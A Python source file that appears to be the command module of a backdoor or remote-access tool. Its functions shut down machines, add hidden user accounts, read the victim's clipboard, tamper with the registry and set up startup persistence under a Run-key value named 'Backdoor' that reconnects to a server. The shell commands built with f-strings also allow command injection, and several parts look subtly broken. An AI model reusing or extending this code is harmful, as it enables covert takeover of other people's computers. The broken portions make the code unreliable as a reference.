import platform
import subprocess
import os
import winreg
import pwd
import pyperclip
import string
import random

def system_shutdown():
    try:
        if platform.system() == "Windows":
            subprocess.run("shutdown /s /t 0", shell=True)
        else:
            subprocess.run("reboot -p", shell=True)
        return "[*] Shutdown initiated"
    except Exception as e:
        return f"[!] Error initiating shutdown: {e}"

def system_reboot():
    try:
        if platform.system() == "Windows":
            subprocess.run("shutdown /r /t 0", shell=True)
        else:
            subprocess.run("reboot", shell=True)
        return "[*] Reboot initiated"
    except Exception as e:
        return f"[!] Error initiating reboot: {e}"

def system_lock():
    try:
        if platform.system() == "Windows":
            subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
        else:
            return "[!] Lock not supported on Android"
        return "[*] System locked"
    except Exception as e:
        return f"[!] Error locking system: {e}"

def list_users():
    try:
        if platform.system() == "Windows":
            result = subprocess.run("net user", shell=True, capture_output=True, text=True)
            return result.stdout
        else:
            users = [pwd.getpwuid(uid).pw_name for uid in os.listdir("/data/data/com.termux/files/home")]
            return "\n".join(users) or "[!] No users found"
    except Exception as e:
        return f"[!] Error listing users: {e}"

def add_user(username, password):
    try:
        if platform.system() == "Windows":
            subprocess.run(f"net user {username} {password} /add", shell=True)
        else:
            subprocess.run(f"useradd -m {username}", shell=True)
            subprocess.run(f"echo '{username}:{password}' | chpasswd", shell=True)
        return f"[*] User {username} added"
    except Exception as e:
        return f"[!] Error adding user: {e}"

def delete_user(username):
    try:
        if platform.system() == "Windows":
            subprocess.run(f"net user {username} /delete", shell=True)
        else:
            subprocess.run(f"userdel -r {username}", shell=True)
        return f"[*] User {username} deleted"
    except Exception as e:
        return f"[!] Error deleting user: {e}"

def get_clipboard():
    try:
        return f"[*] Clipboard content: {pyperclip.paste()}"
    except Exception as e:
        return f"[!] Error getting clipboard: {e}"

def set_clipboard(text):
    try:
        pyperclip.copy(text)
        return f"[*] Clipboard set to: {text}"
    except Exception as e:
        return f"[!] Error setting clipboard: {e}"

def simulate_keylog(seconds):
    try:
        fake_keys = ''.join(random.choices(string.ascii_letters + string.digits, k=seconds * 5))
        return f"[*] Simulated keylog ({seconds}s): {fake_keys}"
    except Exception as e:
        return f"[!] Error simulating keylog: {e}"

def get_registry_value(key, value):
    try:
        if platform.system() != "Windows":
            return "[!] Registry access only supported on Windows"
        hive, subkey = key.split("\\", 1)
        hive_map = {"HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE, "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER}
        with winreg.OpenKey(hive_map[hive], subkey) as key:
            data, _ = winreg.QueryValueEx(key, value)
        return f"[*] Registry {key}\\{value}: {data}"
    except Exception as e:
        return f"[!] Error getting registry value: {e}"

def set_registry_value(key, value, data):
    try:
        if platform.system() != "Windows":
            return "[!] Registry access only supported on Windows"
        hive, subkey = key.split("\\", 1)
        hive_map = {"HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE, "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER}
        with winreg.CreateKey(hive_map[hive], subkey) as key:
            winreg.SetValueEx(key, value, 0, winreg.REG_SZ, data)
        return f"[*] Registry {key}\\{value} set to: {data}"
    except Exception as e:
        return f"[!] Error setting registry value: {e}"

def set_environment_variable(var, value):
    try:
        os.environ[var] = value
        if platform.system() == "Windows":
            subprocess.run(f"setx {var} {value}", shell=True)
        else:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"export {var}={value}\n")
        return f"[*] Environment variable {var} set to {value}"
    except Exception as e:
        return f"[!] Error setting environment variable: {e}"

def enable_persistence():
    try:
        if platform.system() == "Windows":
            script_path = os.path.abspath(__file__)
            key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
                winreg.SetValueEx(reg_key, "Backdoor", 0, winreg.REG_SZ, f"python {script_path} client <server_ip>")
            return "[*] Persistence enabled (Windows registry)"
        else:
            return "[!] Persistence not implemented for Android (requires manual cron setup)"
    except Exception as e:
        return f"[!] Error enabling persistence: {e}"